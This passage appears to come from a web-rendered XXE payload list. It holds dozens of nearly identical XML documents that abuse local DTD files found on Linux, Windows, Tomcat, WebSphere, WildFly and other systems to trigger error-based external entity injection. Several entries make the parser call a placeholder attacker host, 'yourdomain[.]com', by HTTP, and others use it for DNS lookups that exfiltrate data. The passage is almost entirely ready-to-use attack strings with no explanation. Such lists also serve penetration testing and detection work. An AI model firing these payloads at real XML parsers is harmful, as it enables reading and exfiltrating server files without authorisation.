%local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgweather&#x2F;locations.dtd&quot;&gt; &lt;!ENTITY % name &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-20.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgda-5.0&#x2F;dtd&#x2F;libgda-server-operation.dtd&quot;&gt; &lt;!ENTITY % paramlist-dtd &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-21.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgda-5.0&#x2F;dtd&#x2F;libgda-paramlist.dtd&quot;&gt; &lt;!ENTITY % array-dtd &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-22.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;docutils&#x2F;docutils.dtd&quot;&gt; &lt;!ENTITY % measure &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-23.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;dblatex&#x2F;schema&#x2F;dblatex-config.dtd&quot;&gt; &lt;!ENTITY % attlist.modname &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-24.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;lib64&#x2F;erlang&#x2F;lib&#x2F;docbuilder-0.9.8.11&#x2F;dtd&#x2F;application.dtd&quot;&gt; &lt;!ENTITY % block &quot;xxx&quot; &gt; &lt;!ENTITY % common &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-25.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;servlet-api.jar!&#x2F;javax&#x2F;servlet&#x2F;resources&#x2F;XMLSchema.dtd&quot;&gt; &lt;!ENTITY % xs-datatypes &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-26.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt; &lt;!ENTITY % CIMName &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-1&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\wmi20.dtd&quot;&gt; &lt;!ENTITY % CIMName &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-2&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Program Files (x86)\Lotus\Notes\domino.dtd&quot;&gt;&lt;!ENTITY % boolean &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-3&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\xwizard.dtd&quot;&gt;&lt;!ENTITY % onerrortypes &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-4&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamsa &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-5&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;jsp-api.jar!&#x2F;javax&#x2F;servlet&#x2F;jsp&#x2F;resources&#x2F;jspxml.dtd&quot;&gt;&lt;!ENTITY % URI &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-6&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;tomcat-coyote.jar!&#x2F;org&#x2F;apache&#x2F;tomcat&#x2F;util&#x2F;modeler&#x2F;mbeans-descriptors.dtd&quot;&gt; &lt;!ENTITY % Boolean &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-7&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;scrollkeeper&#x2F;dtds&#x2F;scrollkeeper-omf.dtd&quot;&gt; &lt;!ENTITY % url.attribute.set &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-8&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;opt&#x2F;IBM&#x2F;WebSphere&#x2F;AppServer&#x2F;properties&#x2F;sip-app_1_0.dtd&quot;&gt; &lt;!ENTITY % condition &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-9&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;fontconfig&#x2F;fonts.dtd&quot;&gt; &lt;!ENTITY % constant &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-10&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;struts&#x2F;struts-config_1_1.dtd&quot;&gt; &lt;!ENTITY % AttributeName &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-11&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;u01&#x2F;oracle&#x2F;wlserver&#x2F;server&#x2F;lib&#x2F;consoleapp&#x2F;webapp&#x2F;WEB-INF&#x2F;struts-config_1_2.dtd&quot;&gt; &lt;!ENTITY % AttributeName &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-12&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;gtksourceview-4&#x2F;language-specs&#x2F;language.dtd&quot;&gt; &lt;!ENTITY % itemattrs &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-13&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;lib&#x2F;gap&#x2F;pkg&#x2F;GAPDoc-1.6.2&#x2F;bibxmlext.dtd&quot;&gt; &lt;!ENTITY % n.InProceedings &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-14&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;boostbook&#x2F;dtd&#x2F;boostbook.dtd&quot;&gt; &lt;!ENTITY % boost.common.attrib &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-15&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;opt&#x2F;jboss&#x2F;wildfly&#x2F;modules&#x2F;system&#x2F;layers&#x2F;base&#x2F;org&#x2F;apache&#x2F;lucene&#x2F;main&#x2F;lucene-queryparser-5.5.5.jar!&#x2F;org&#x2F;apache&#x2F;lucene&#x2F;queryparser&#x2F;xml&#x2F;LuceneCoreQuery.dtd&quot;&gt; &lt;!ENTITY % queries &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-16&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;opt&#x2F;jboss&#x2F;wildfly&#x2F;modules&#x2F;system&#x2F;layers&#x2F;base&#x2F;org&#x2F;apache&#x2F;xml-resolver&#x2F;main&#x2F;xml-resolver-1.2.jar!&#x2F;org&#x2F;apache&#x2F;xml&#x2F;resolver&#x2F;etc&#x2F;catalog.dtd&quot;&gt; &lt;!ENTITY % publicIdentifier &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-17&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;nmap.dtd&quot;&gt; &lt;!ENTITY % attr_numeric &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-18&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;liteide&#x2F;liteeditor&#x2F;kate&#x2F;language.dtd&quot;&gt; &lt;!ENTITY % commonAttributes &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-19&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgweather&#x2F;locations.dtd&quot;&gt; &lt;!ENTITY % name &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-20&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgda-5.0&#x2F;dtd&#x2F;libgda-server-operation.dtd&quot;&gt; &lt;!ENTITY % paramlist-dtd &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-21&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgda-5.0&#x2F;dtd&#x2F;libgda-paramlist.dtd&quot;&gt; &lt;!ENTITY % array-dtd &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-22&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;docutils&#x2F;docutils.dtd&quot;&gt; &lt;!ENTITY % measure &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-23&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;dblatex&#x2F;schema&#x2F;dblatex-config.dtd&quot;&gt; &lt;!ENTITY % attlist.modname &#39;&gt; 